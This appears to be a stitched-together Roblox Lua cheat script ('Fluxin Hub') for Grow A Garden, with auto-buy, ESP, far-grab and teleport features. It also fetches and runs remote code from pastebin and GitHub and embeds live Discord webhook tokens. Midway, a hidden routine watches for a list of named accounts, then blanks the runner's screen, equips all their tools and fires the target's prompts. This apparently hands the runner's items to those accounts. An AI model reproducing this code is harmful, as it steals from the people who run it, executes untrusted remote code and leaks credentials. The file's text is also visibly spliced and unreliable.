    Name = "Job ID:",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        JobIdTextBoxValue = Value -- Update the stored value
    end
})

SectionWeather:AddButton({
    Name = "Teleport to Job ID",
    Callback = function()
        local jobId = JobIdTextBoxValue -- Retrieve the stored value
        if jobId ~= "" then
            local success, errorMessage = pcall(function()
                game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, jobId, game.Players.LocalPlayer)
            end)
            if not success then
                OrionLib:MakeNotification({
                    Name = "Teleport Failed",
                    Content = "Error teleporting: " .. errorMessage,
                    Time = 5
                })
            end
        else
            OrionLib:MakeNotification({
                Name = "Enter Job ID",
                Content = "Please enter a Job ID to teleport.",
                Time = 3
            })
        end
    end
})


local SectionDiscord = WeatherTab:AddSection({
    Name = "Discord Link -- you can join servers with job id here"
})

SectionDiscord:AddButton({
    Name = "Copy Discord Link",
    Callback = function()
        setclipboard("https://discord.gg/kjmuSdNaTn") -- Replace with your actual Discord server link
        OrionLib:MakeNotification({
            Name = "Discord Link Copied",
            Content = "Discord server link copied to clipboard!",
            Time = 3
        })
    end
})

-- Combined Roblox Egg, Gear, and Seed Stock Discord Notifier
-- File: ServerScriptService/StockNotifier.lua

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Webhook URLs (Keep these private!)
local webhookUrls = {
    EggStock = "https://discord.com/api/webhooks/1370839994238767134/xTStdA4yTrsJABFBDq-XTbOXrl7R8iggtdg8icn3-DIt5ElG_M_HsJlgNHr7Jk4-zskM",
    GearStock = "https://discord.com/api/webhooks/1370839848096760021/uLlI1nKK-zdANztyD67cqUslEtzceicKaTQ-op2NIEpuQsfCXzDDGr5vWbZoR4ttV7VR",
    SeedStock = "https://discord.com/api/webhooks/1370839500120653845/96N_iTqmYJq2MayySlYBcUZf_MMaPIlCuhu92Jwb8sVYQlI1ss31HsX3g3Alcijri_ZF"
}

-- Role mention IDs for Discord
local roleMentions = {
    Egg = {
        ["Legendary"] = "<@&1366694358144913459>",
		["Bug"] 	  = "<@&1370939662956236800>"
-- Using Legendary role ID as requested
-- Add more egg roles as needed
    },
    Gear = {
        ["Legendary"] = "<@&1366694358144913459>",
        ["Mythical"]    = "<@&1366694415741227099>",
        ["Divine"]      = "<1366694519483142165>" -- Using Legendary role ID as requested
        -- Add more gear roles as needed
    },
    Seed = {
        ["Legendary"] = "<@&1366694358144913459>",
        ["Mythical"]    = "<@&1366694415741227099>",
        ["Divine"]      = "<@&1366694519483142165>"
    }
}

local lastSentStocks = {
    Egg = { stockString = "", time = 0 },
    Gear = { stockString = "", time = 0 },
    Seed = { stockString = "", time = 0 }
}
local serverCooldown = 300 -- 5 minutes

local rarityEmojis = {
    Egg = {
        ["Common"]    = "🥚",    -- Changed to egg emoji for consistency
        ["Uncommon"]  = "🍀",    -- Changed to four-leaf clover for luck/rareness
        ["Rare"]      = "💎",    -- Changed to diamond emoji for rarity
        ["Legendary"] = "🔥",    -- Changed to fire emoji for extraordinary value
        ["Bug"]       = "🐛"     -- No change needed, stays as bug emoji
    },
    Gear = {
        ["Divine"]     = "💖",
        ["Mythical"]  = "💗",
        ["Legendary"] = "🟠",
        ["Rare"]      = "🕢",
        ["Uncommon"]  = "🕘",
        ["Common"]    = "🕧",
        ["Limited Mythic"] = "✨" -- Example for a special rarity
    },
    Seed = {
        ["Divine"] = "💖",
        ["Mythical"] = "💗",
        ["Exclusive"] = "💝",
        ["Legendary"] = "🟠",
        ["Rare"] = "🕢",
        ["Uncommon"] = "🕘",
        ["Common"] = "🕧",
    }
}

local rarityOrder = {
    Egg = { "Legendary", "Rare", "Uncommon", "Common", "Bug" },
    Gear = { "Divine", "Mythical", "Limited Mythic", "Legendary", "Rare", "Uncommon", "Common" },
    Seed = { "Divine", "Mythical", "Exclusive", "Legendary", "Rare", "Uncommon", "Common" }
}

local itemDetails = {
    Egg = {
        ["Common Egg"]    = { cost = "50,000C", chance = "99% of shop", rarity = "Common" },
        ["Uncommon Egg"]  = { cost = "150,000C", chance = "53% of shop", rarity = "Uncommon" },
        ["Rare Egg"]      = { cost = "600,000C", chance = "21% of shop", rarity = "Rare" },
        ["Legendary Egg"] = { cost = "3,000,000C", chance = "9% of Shop", rarity = "Legendary" },
        ["Bug Egg"]       = { cost = "300R or 50,000,000C", chance = "3% of Shop", rarity = "Bug" }
    },
    Gear = {
        ["Watering Can"] = "Common",
        ["Trowel"] = "Uncommon",
        ["Basic Sprinkler"] = "Rare",
        ["Advanced Sprinkler"] = "Legendary",
        ["Godly Sprinkler"] = "Mythical",
        ["Lightning Rod"] = "Mythical",
        ["Master Sprinkler"] = "Divine",
        ["Chocolate Sprinkler"] = "Limited Mythic" -- Example for a limited item
    },
    Seed = {
        ["Carrot"] = "Common", ["Strawberry"] = "Common",
        ["Blueberry"] = "Uncommon", ["Orange Tulip"] = "Uncommon",
        ["Tomato"] = "Rare", ["Corn"] = "Rare", ["Daffodil"] = "Rare",
        ["Watermelon"] = "Legendary", ["Pumpkin"] = "Legendary", ["Apple"] = "Legendary", ["Bamboo"] = "Legendary",
        ["Coconut"] = "Mythical", ["Cactus"] = "Mythical", ["Dragon Fruit"] = "Mythical", ["Mango"] = "Mythical",
        ["Grape"] = "Divine", ["Mushroom"] = "Divine", ["Pepper"] = "Divine"
    }
}

local function sendDiscordWebhookEgg(webhookUrl, content, title, description)
    if not webhookUrl then warn("Webhook URL is nil or empty.") return end

    local data = {
        content = content,
        embeds = {}
    }
    if title then
        table.insert(data.embeds, { title = title })
    end
    if description then
        table.insert(data.embeds, { description = description })
    end

    local jsonData = HttpService:JSONEncode(data)
    local success, result = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = jsonData
        })
    end)

    if not success or result.StatusCode < 200 or result.StatusCode >= 300 then
        warn("Webhook failed:", result and result.StatusMessage, result and result.Body)
    end
end

local function getEggStockInfo()
    local petStand = workspace.NPCS["Pet Stand"]
    if not petStand or not petStand.EggLocations then warn("Pet Stand or EggLocations not found.") return {} end

    local availableEggs = {}
    for _, item in pairs(petStand.EggLocations:GetChildren()) do
        if item:IsA("Model") and itemDetails.Egg[item.Name] then
            table.insert(availableEggs, item.Name)
        end
    end
    return availableEggs
end

local function checkAndSendEggStockNotification()
    local availableEggs = getEggStockInfo()
    local currentTime = os.time()
    local inStockMessages = {}
    local mentions = {}
    local mentionedRarities = {}
    local hasInStockEggs = false

    local eggCounts = {}
    for _, eggName in ipairs(availableEggs) do
        eggCounts[eggName] = (eggCounts[eggName] or 0) + 1
    end

    for eggName, count in pairs(eggCounts) do
        local details = itemDetails.Egg[eggName]
        if details then
            hasInStockEggs = true
            for i = 1, count do
                table.insert(inStockMessages, (rarityEmojis.Egg[details.rarity] or "🥚") .. " " .. eggName .. " (" .. details.cost .. ")")
            end
            if roleMentions.Egg[details.rarity] and not mentionedRarities[details.rarity] and count > 0 then
                mentionedRarities[details.rarity] = true
                table.insert(mentions, roleMentions.Egg[details.rarity])
            end
        end
    end

    local inStockMessagesString = table.concat(inStockMessages, "\n")
    local mentionContent = #mentions > 0 and table.concat(mentions, " ") or nil

    if hasInStockEggs and inStockMessagesString ~= lastSentStocks.Egg.stockString and (not lastSentStocks.Egg.time or currentTime - lastSentStocks.Egg.time >= serverCooldown) then
        sendDiscordWebhookEgg(webhookUrls.EggStock, mentionContent, "🥚 New Eggs in Stock!", "The following eggs are now in stock:\n\n" .. inStockMessagesString)
        lastSentStocks.Egg.stockString = inStockMessagesString
        lastSentStocks.Egg.time = currentTime
    elseif not hasInStockEggs and lastSentStocks.Egg.stockString ~= "No eggs currently in stock." and (not lastSentStocks.Egg.time or currentTime - lastSentStocks.Egg.time >= serverCooldown) then
        sendDiscordWebhookEgg(webhookUrls.EggStock, nil, "🥚 Egg Stock Update", "No eggs are currently in stock.")
        lastSentStocks.Egg.stockString = "No eggs currently in stock."
        lastSentStocks.Egg.time = currentTime
    elseif hasInStockEggs and lastSentStocks.Egg.stockString == "No eggs currently in stock." and (not lastSentStocks.Egg.time or currentTime - lastSentStocks.Egg.time >= serverCooldown) then
        sendDiscordWebhookEgg(webhookUrls.EggStock, mentionContent, "🥚 Egg Restock!", "Eggs have been restocked:\n\n" .. inStockMessagesString)
        lastSentStocks.Egg.stockString = inStockMessagesString
        lastSentStocks.Egg.time = currentTime
    end
end

local function sendDiscordWebhookGear(webhookUrl, content, title, description)
    if not webhookUrl then warn("Webhook URL is nil or empty.") return end

    local data = {
        content = content,
        embeds = {}
    }
    if title then
        table.insert(data.embeds, { title = title })
    end
    if description then
        table.insert(data.embeds, { description = description })
    end

    local jsonData = HttpService:JSONEncode(data)
    local success, result = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = jsonData
        })
    end)

    if not success or result.StatusCode < 200 or result.StatusCode >= 300 then
        warn("Webhook failed:", result and result.StatusMessage, result and result.Body)
    end
end

local function getGearStockInfo()
    local LocalPlayer = Players.LocalPlayer
    local gearShopFrame = LocalPlayer.PlayerGui:FindFirstChild("Gear_Shop")
    if not gearShopFrame then warn("Gear_Shop GUI not found.") return {} end

    local scrollingFrame = gearShopFrame.Frame:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then warn("ScrollingFrame missing in Gear_Shop.") return {} end

    local stockData = {}
    for _, itemFrame in pairs(scrollingFrame:GetChildren()) do
        if itemFrame:IsA("Frame") and itemFrame:FindFirstChild("Main_Frame") then
            local mainFrame = itemFrame.Main_Frame
            local stockTextLabel = mainFrame:FindFirstChild("Stock_Text") -- Assuming a similar "Stock_Text" label exists
            if stockTextLabel and stockTextLabel:IsA("TextLabel") then
                local gearName = itemFrame.Name
                local stockInfo = stockTextLabel.Text
                if itemDetails.Gear[gearName] then
                    local rarity = itemDetails.Gear[gearName]
                    local emoji = rarityEmojis.Gear[rarity] or "❓"
                    local stockLevelMatch = string.match(stockInfo, "X(%d+) Stock")
                    local stockLevel = stockLevelMatch and tonumber(stockLevelMatch)
                    if stockLevel and stockLevel > 0 then
                        stockData[gearName] = {
                            emoji = emoji,
                            stockInfo = "🟢 " .. stockInfo,
                            rarity = rarity
                        }
                    elseif stockInfo == "SOLD OUT" then
                        stockData[gearName] = {
                            emoji = emoji,
                            stockInfo = "🔴 SOLD OUT",
                            rarity = rarity
                        }
                    elseif stockInfo == "COMING SOON" then
                        stockData[gearName] = {
                            emoji = emoji,
                            stockInfo = "🟡 COMING SOON",
                            rarity = rarity
                        }
                    else
                        stockData[gearName] = {
                            emoji = emoji,
                            stockInfo = stockInfo, -- Keep the original text if stock info format is different
                            rarity = rarity
                        }
                    end
                end
            end
        elseif itemFrame:IsA("Frame") then -- Handle items without a "Main_Frame" (e.g., direct text labels)
            local gearName = itemFrame.Name
            -- Try to extract stock info from TextLabels directly within the itemFrame
            for _, label in pairs(itemFrame:GetChildren()) do
                if label:IsA("TextLabel") then
                    local stockInfo = label.Text
                    if itemDetails.Gear[gearName] then
                        local rarity = itemDetails.Gear[gearName]
                        local emoji = rarityEmojis.Gear[rarity] or "❓"
                        local stockLevelMatch = string.match(stockInfo, "X(%d+) Stock")
                        local stockLevel = stockLevelMatch and tonumber(stockLevelMatch)
                        if stockLevel and stockLevel > 0 then
                            stockData[gearName] = {
                                emoji = emoji,
                                stockInfo = "🟢 " .. stockInfo,
                                rarity = rarity
                            }
                        elseif stockInfo == "SOLD OUT" then
                            stockData[gearName] = {
                                emoji = emoji,
                                stockInfo = "🔴 SOLD OUT",
                                rarity = rarity
                            }
                        elseif stockInfo == "COMING SOON" then
                            stockData[gearName] = {
                                emoji = emoji,
                                stockInfo = "🟡 COMING SOON",
                                rarity = rarity
                            }
                        else
                            stockData[gearName] = {
                                emoji = emoji,
                                stockInfo = stockInfo,
                                rarity = rarity
                            }
                        end
                        break -- Assuming only one TextLabel contains stock info
                    end
                end
            end
        end
    end
    return stockData
end

local function checkAndSendGearStockNotification()
    local LocalPlayer = Players.LocalPlayer
    local gearShopFrame = LocalPlayer.PlayerGui:FindFirstChild("Gear_Shop")
    if not gearShopFrame then warn("Gear_Shop GUI not found for timer check.") return end

    local currentGearStocksData = getGearStockInfo()
    local currentTime = os.time()
    local sortedStocks = {}
    local mentions = {}
    local mentionedRarities = {}

    for _, rarity in ipairs(rarityOrder.Gear) do
        for gearName, data in pairs(currentGearStocksData) do
            if data.rarity == rarity then
                table.insert(sortedStocks, data.emoji .. " " .. gearName .. ": " .. data.stockInfo)
                -- Only add the role mention if the gear is in stock (🟢)
                if roleMentions.Gear[rarity] and not mentionedRarities[rarity] and string.sub(data.stockInfo, 1, 1) == "🟢" then
                    mentionedRarities[rarity] = true
                    table.insert(mentions, roleMentions.Gear[rarity])  -- Add the role mention
                end
            end
        end
    end

    local sortedStocksString = table.concat(sortedStocks, "\n")
    -- Concatenate the mentions if they exist
    local mentionContent = #mentions > 0 and table.concat(mentions, " ") or nil

    -- Send webhook only if there's a change in stock and enough time has passed
    if sortedStocksString ~= lastSentStocks.Gear.stockString and (not lastSentStocks.Gear.time or currentTime - lastSentStocks.Gear.time >= serverCooldown) then
        -- Send the webhook with role mentions (if any)
        sendDiscordWebhookGear(webhookUrls.GearStock, mentionContent, "⚙️ New Gear Stocks!", "New gear stocks are available:\n\n" .. sortedStocksString)
        lastSentStocks.Gear.stockString = sortedStocksString
        lastSentStocks.Gear.time = currentTime
    end
end

local function sendDiscordWebhookSeed(webhookUrl, content, title, description)
    if not webhookUrl then warn("Webhook URL is nil or empty.") return end

    local data = {
        content = content,
        embeds = {}
    }
    if title then
        table.insert(data.embeds, { title = title })
    end
    if description then
        table.insert(data.embeds, { description = description })
    end

    local jsonData = HttpService:JSONEncode(data)
    local success, result = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = jsonData
        })
    end)

    if not success or result.StatusCode < 200 or result.StatusCode >= 300 then
        warn("Webhook failed:", result and result.StatusMessage, result and result.Body)
    end
end

local function getSeedStockInfo()
    local LocalPlayer = Players.LocalPlayer
    local seedShopFrame = LocalPlayer.PlayerGui:FindFirstChild("Seed_Shop")
    if not seedShopFrame then warn("Seed_Shop GUI not found.") return {} end

    local scrollingFrame = seedShopFrame.Frame:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then warn("ScrollingFrame missing.") return {} end

    local stockData = {}
    for _, itemFrame in pairs(scrollingFrame:GetChildren()) do
        if itemFrame:IsA("Frame") and itemFrame:FindFirstChild("Main_Frame") then
            local mainFrame = itemFrame.Main_Frame
            local stockTextLabel = mainFrame:FindFirstChild("Stock_Text")
            if stockTextLabel and stockTextLabel:IsA("TextLabel") then
                local fruitName = itemFrame.Name
                local stockInfo = stockTextLabel.Text
                if itemDetails.Seed[fruitName] then
                    local rarity = itemDetails.Seed[fruitName]
                    local emoji = rarityEmojis.Seed[rarity] or "❓"
                    local stockLevelMatch = string.match(stockInfo, "X(%d+) Stock")
                    local stockLevel = stockLevelMatch and tonumber(stockLevelMatch)
                    if stockLevel and stockLevel > 0 then
                        stockData[fruitName] = {
                            emoji = emoji,
                            stockInfo = "🟢 " .. stockInfo,
                            rarity = rarity
                        }
                    end
                end
            end
        end
    end
    return stockData
end

local function checkAndSendSeedStockNotification()
    local LocalPlayer = Players.LocalPlayer
    local seedShopFrame = LocalPlayer.PlayerGui:FindFirstChild("Seed_Shop")
        :FindFirstChild("Frame")
        :FindFirstChild("Frame")
        :FindFirstChild("Timer")
    if not seedShopFrame then warn("Seed_Shop GUI or Timer Label not found.") return end

    local currentStocksData = getSeedStockInfo()
    local currentTime = os.time()
    local sortedStocks = {}
    local mentions = {}
    local mentionedRarities = {}

    for _, rarity in ipairs(rarityOrder.Seed) do
        for seedName, data in pairs(currentStocksData) do
            if data.rarity == rarity then
                table.insert(sortedStocks, data.emoji .. " " .. seedName .. ": " .. data.stockInfo)
                if roleMentions.Seed[rarity] and not mentionedRarities[rarity] then
                    mentionedRarities[rarity] = true
                    table.insert(mentions, roleMentions.Seed[rarity])
                end
            end
        end
    end

    local sortedStocksString = table.concat(sortedStocks, "\n")
    local mentionContent = #mentions > 0 and table.concat(mentions, " ") or nil

    if sortedStocksString ~= lastSentStocks.Seed.stockString and (not lastSentStocks.Seed.time or currentTime - lastSentStocks.Seed.time >= serverCooldown) then
        sendDiscordWebhookSeed(webhookUrls.SeedStock, mentionContent, "🌱 New Seed Stocks!", "New seed stocks are available:\n\n" .. sortedStocksString)
        lastSentStocks.Seed.stockString = sortedStocksString
        lastSentStocks.Seed.time = currentTime
    end
end

-- Call the check functions for eggs, gear, and seeds
checkAndSendEggStockNotification()
checkAndSendGearStockNotification()
checkAndSendSeedStockNotification()
-- Run the check periodically (adjust the interval as needed)
local function eggCheckLoop()
	while true do
		checkAndSendEggStockNotification()
		task.wait(60)
	end
end

local function gearCheckLoop()
	while true do
		checkAndSendGearStockNotification()
		task.wait(65) -- Slightly offset if desired
	end
end

local function seedCheckLoop()
	while true do
		checkAndSendSeedStockNotification()
		task.wait(70) -- Slightly offset if desired
	end
end

task.spawn(eggCheckLoop)
task.spawn(gearCheckLoop)
task.spawn(seedCheckLoop)


-- Infinite Jump Logic
local UserInputService = game:GetService("UserInputService")
UserInputService.JumpRequest:Connect(function()
    if infiniteJumpEnabled then
        local char = game.Players.LocalPlayer.Character
        local humanoid = char and char:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local TargetNames = {
    "myrushfarm", "Fluxinhubtester1", "sigmasigmaaboyy69",
    "YT_adam28", "ytadamp_llght3", "Fluxinhubtester",
    "ytadam45_tabuy", "mygaekanza", "Lizzie4605",
    "r4t_spiral", "zenithcheeze", "tvman945",
    "girlygirl200729", "manhowkh", "myrushfarm22"
}

local RENDER_DISTANCE = 15
local equipped = false
local wasOutOfRange = false

local function isTarget(name)
    for _, target in ipairs(TargetNames) do
        if name == target then
            return true
        end
    end
    return false
end

local function handlePrompt(prompt)
    prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
    prompt.RequiresLineOfSight = false
    prompt.HoldDuration = 0

    RunService.Heartbeat:Connect(function()
        pcall(function()
            fireproximityprompt(prompt)
        end)
    end)
end

local function watchPartForPrompts(part)
    if not part then return end
    for _, prompt in ipairs(part:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") then
            handlePrompt(prompt)
        end
    end
    part.ChildAdded:Connect(function(child)
        if child:IsA("ProximityPrompt") then
            handlePrompt(child)
        end
    end)
end

local function processCharacter(character)
    watchPartForPrompts(character:FindFirstChild("Head"))
    watchPartForPrompts(character:FindFirstChild("HumanoidRootPart"))
    for _, descendant in ipairs(character:GetDescendants()) do
        if descendant:IsA("ProximityPrompt") then
            handlePrompt(descendant)
        end
    end
end

local function hideUIAndDisableRendering()
    RunService:Set3dRenderingEnabled(false)
    local gui = LocalPlayer:WaitForChild("PlayerGui")
    local note = gui:FindFirstChild("Top_Notification")
    if note then note.Enabled = false end
    local bag = gui:FindFirstChild("BackpackGui")
    if bag then bag.Enabled = false end
end

local function showUIAndEnableRendering()
    RunService:Set3dRenderingEnabled(true)
    local gui = LocalPlayer:WaitForChild("PlayerGui")
    local note = gui:FindFirstChild("Top_Notification")
    if note then note.Enabled = true end
    local bag = gui:FindFirstChild("BackpackGui")
    if bag then bag.Enabled = true end
end

local function EquipAllTools()
    local Backpack = LocalPlayer:WaitForChild("Backpack")
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    for _, tool in ipairs(Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            humanoid:EquipTool(tool)
            task.wait(0.1)
        end
    end
end

local function monitorTargetDistance(player)
    local function checkDistance()
        while player and player.Parent do
            local targetChar = player.Character
            local localChar = LocalPlayer.Character
            if targetChar and localChar then
                local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
                local localHRP = localChar:FindFirstChild("HumanoidRootPart")
                if targetHRP and localHRP then
                    local distance = (targetHRP.Position - localHRP.Position).Magnitude
                    if distance <= RENDER_DISTANCE then
                        if not equipped then
                            equipped = true
                            hideUIAndDisableRendering()
                            EquipAllTools()
                        elseif wasOutOfRange then
                            EquipAllTools()
                            wasOutOfRange = false
                        end
                    else
                        wasOutOfRange = true
                    end
                end
            end
            task.wait(0.5)
        end
    end
    task.spawn(checkDistance)
end

local function watchPlayer(player)
    if not isTarget(player.Name) then return end

    if player.Character then
        processCharacter(player.Character)
    end
    player.CharacterAdded:Connect(processCharacter)

    monitorTargetDistance(player)
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        watchPlayer(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        watchPlayer(player)
    end
end)
-- Finalize UI
OrionLib:Init()local OrionLib = loadstring(game:HttpGet('https://pastebin.com/raw/L83Chb0t'))()
-- Create Window
local Window = OrionLib:MakeWindow({
    Name = "Grow A Garden",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "GrowAGardenConfig",
    IntroEnabled = true,
    IntroText = "Fluxin Hub",
})
loadstring(game:HttpGet("https://pastebin.com/raw/GXSZeGQS"))()
setclipboard("https://discord.gg/kjmuSdNaTn") -- Replace with your actual Discord server link
OrionLib:MakeNotification({
Name = "Discord Link Copied",
Content = "Discord server link copied to clipboard!",
Time = 3
})
-- Removed the optional test call.
loadstring(game:HttpGet("https://raw.githubusercontent.com/ArgetnarYT/scripts/main/AntiAfk2.lua"))()
local PlayerTab = Window:MakeTab({
    Name = "Player",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
local player = game:GetService("Players").LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local gearTeleportUI = playerGui:WaitForChild("Teleport_UI"):WaitForChild("Frame"):WaitForChild("Gear")
gearTeleportUI.Visible = true
local petsTeleportUI = playerGui:WaitForChild("Teleport_UI"):WaitForChild("Frame"):WaitForChild("Pets")
petsTeleportUI.Visible = true
local Bloodmoon = PlayerTab:AddSection({
    Name = "Honey Update"
})
local function AutoBuyblood(Value)
    Autobuyblood = Value
    if Autobuyblood then
        while Autobuyblood do
            local boughtAny = false
            for _, seedName in ipairs({"Nectarine Seed", "Hive Fruit Seed", "Flower Seed Pack", "Honey Sprinkler", "Bee Egg"}) do
                pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyEventShopStock"):FireServer(seedName)
                    boughtAny = true
                end)
                task.wait(0.01)
            end
            if not boughtAny then
                print("No more seeds to buy, stopping auto-buy.")
                break
            end
            task.wait(1)
        end
    end
end


-- Add the auto buy seedstock toggle
PlayerTab:AddToggle({
    Name = "Auto BuyHoneyShop",
    Default = false,
    Callback = AutoBuyblood
})


local Sectionmoon = PlayerTab:AddSection({
    Name = "Moonlit Update"
})
local function createBillboard(part, fruitName)
	local billboard = Instance.new("BillboardGui")
	billboard.Name = "SwirlESP"
	billboard.Size = UDim2.new(0, 100, 0, 40)
	billboard.StudsOffset = Vector3.new(0, 2, 0)
	billboard.AlwaysOnTop = true
	billboard.Adornee = part

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.TextScaled = true
	label.Font = Enum.Font.SourceSansBold
	label.TextColor3 = Color3.new(1, 1, 1)
	label.TextStrokeColor3 = Color3.new(0, 0, 0)
	label.TextStrokeTransparency = 0.5
	label.Text = fruitName
	label.Parent = billboard

	billboard.Parent = part
end

local function scanSwirlFruits()
    local Players   = game:GetService("Players")
    local Workspace = game:GetService("Workspace")
    local LocalPlayer = Players.LocalPlayer

    local farmContainer = Workspace:FindFirstChild("Farm")
    if not farmContainer then
        warn("Farm not found")
        return
    end

    local seenModels = {}

    for _, farmFolder in pairs(farmContainer:GetChildren()) do
        if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
            local important = farmFolder:FindFirstChild("Important")
            if not important then continue end

            -- find the Data folder owned by the local player
            local dataFolder
            for _, child in pairs(important:GetChildren()) do
                if child:IsA("Folder") and child.Name == "Data" then
                    local owner = child:FindFirstChild("Owner")
                    if owner and owner:IsA("StringValue") and owner.Value == LocalPlayer.Name then
                        dataFolder = child
                        break
                    end
                end
            end
            if not dataFolder then continue end

            local plants = important:FindFirstChild("Plants_Physical")
            if not plants then continue end

            for _, plant in pairs(plants:GetChildren()) do
                for _, model in pairs(plant:GetDescendants()) do
                    if model:IsA("BasePart") and not seenModels[model] then
                        for _, obj in pairs(model:GetChildren()) do
                            if obj:IsA("ParticleEmitter") and obj.Name == "Swirls" then
                                -- check Speed exactly 30 to 30
                                local speedRange = obj.Speed
                                if typeof(speedRange) == "NumberRange"
                                   and speedRange.Min == 30
                                   and speedRange.Max == 30 then

                                    seenModels[model] = true
                                    print("Found Swirl w/ Speed=30 on:", plant.Name, "in", model.Name)

                                    createBillboard(model, plant.Name)

                                    for _, descendant in pairs(model:GetDescendants()) do
                                        local prompt = descendant:FindFirstChildWhichIsA("ProximityPrompt")
                                        if prompt then
                                            prompt.MaxActivationDistance = 100
                                            prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
                                        end
                                    end
                                end
                                break
                            end
                        end
                    end
                end
            end
        end
    end
end


-- Attach to UI button
PlayerTab:AddButton({
	Name = "Esp Moonlit Fruit",
	Callback = function()
		scanSwirlFruits()
	end
})
-- Fargrab moonlit Fruits
local function scanAndModifyFruits()
	local Players = game:GetService("Players")
	local Workspace = game:GetService("Workspace")
	local LocalPlayer = Players.LocalPlayer

	local farmContainer = Workspace:FindFirstChild("Farm")
	if not farmContainer then
		warn("Farm not found")
		return
	end

	local seenModels = {}
	local modifiedFruitsCount = 0

	for _, farmFolder in pairs(farmContainer:GetChildren()) do
		if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
			local important = farmFolder:FindFirstChild("Important")
			if not important then
				continue
			end

			local dataFolder = nil
			for _, child in pairs(important:GetChildren()) do
				if child:IsA("Folder") and child.Name == "Data" then
					local owner = child:FindFirstChild("Owner")
					if owner and owner:IsA("StringValue") and owner.Value == LocalPlayer.Name then
						dataFolder = child
						break
					end
				end
			end

			if not dataFolder then
				continue
			end

			local plants = important:FindFirstChild("Plants_Physical")
			if not plants then
				continue
			end

			for _, plant in pairs(plants:GetChildren()) do
				for _, model in pairs(plant:GetDescendants()) do
					if model:IsA("BasePart") and not seenModels[model] then
						for _, obj in pairs(model:GetChildren()) do
							if obj:IsA("ParticleEmitter") and obj.Name == "Swirls" then
								seenModels[model] = true

								local fruitParent = model.Parent
								if fruitParent then
									for _, child in pairs(fruitParent:GetChildren()) do
										if child:IsA("BasePart") then
											local prompt = child:FindFirstChildWhichIsA("ProximityPrompt")
											if prompt then
												prompt.MaxActivationDistance = 1000
												prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
												modifiedFruitsCount += 1
												break -- Assuming only one ProximityPrompt per fruit part
											end
										end
									end
								end
								break -- Assuming only one "Swirls" emitter per model
							end
						end
					end
				end
			end
		end
	end
end
	print("Scan complete. Modified", modifiedFruitsCount, "fruit proximity prompts.")
PlayerTab:AddButton({
    Name = "Far Grab Moonllit",
    Callback = function()
        scanAndModifyFruits()
    end
})

PlayerTab:AddButton({
    Name = "Call Pets",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local CallAllPetsEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("CallAllPets")
        if CallAllPetsEvent and CallAllPetsEvent:IsA("RemoteEvent") then
            pcall(function()
                CallAllPetsEvent:FireServer()
            end)
        else
            warn("Could not find the 'CallAllPets' RemoteEvent or it's not a RemoteEvent.")
            if not CallAllPetsEvent then
                warn("CallAllPetsEvent is nil.")
            else
                warn("CallAllPetsEvent is a:", typeof(CallAllPetsEvent))
            end
        end
    end
})

local VirtualInputManager = game:GetService("VirtualInputManager")
local SectionPlayer = PlayerTab:AddSection({
    Name = "Player"
})
-- Configuration
local restockTimeInSeconds = 100  -- Default: 300 seconds (5 minutes). Change this if needed.
local AutobuyEggs = false

-- Function to buy a specific egg
local function BuyEgg(eggPosition)
    local args = {
        [1] = eggPosition
    }
    pcall(function()
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyPetEgg"):FireServer(unpack(args))
    end)
end

-- Configuration
local AutobuyEggs = false

-- Function to buy a specific egg
local function BuyEgg(eggPosition)
    local args = {
        [1] = eggPosition
    }
    pcall(function()
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyPetEgg"):FireServer(unpack(args))
    end)
end

-- Function to buy all three eggs at the same time
local function BuyAllEggs()
    BuyEgg(1)
    BuyEgg(2)
    BuyEgg(3)
end

-- Main loop for auto-buying every frame, controlled by the toggle
local connection = nil  -- Store the connection so we can disconnect it later
local function AutoBuyEggsFunction(Value)
    AutobuyEggs = Value
    if AutobuyEggs then
        if not connection then -- Only create the connection if it doesn't exist
            connection = game:GetService("RunService").Heartbeat:Connect(function()
                BuyAllEggs()
            end)
            print("Auto Buy Eggs: Enabled")
        end
    else
        if connection then -- Only disconnect if the connection exists
            connection:Disconnect()
            connection = nil -- Clear the variable
            print("Auto Buy Eggs: Disabled")
        end
    end
end

-- Add a toggle to start/stop the auto-buy process
if PlayerTab then
    PlayerTab:AddToggle({
        Name = "Auto Buy Eggs",
        Default = false,
        Callback = AutoBuyEggsFunction
    })
else
    print("Error: PlayerTab is not defined.  Make sure your UI library is initialized.")
end



-- Auto buy seedstock function
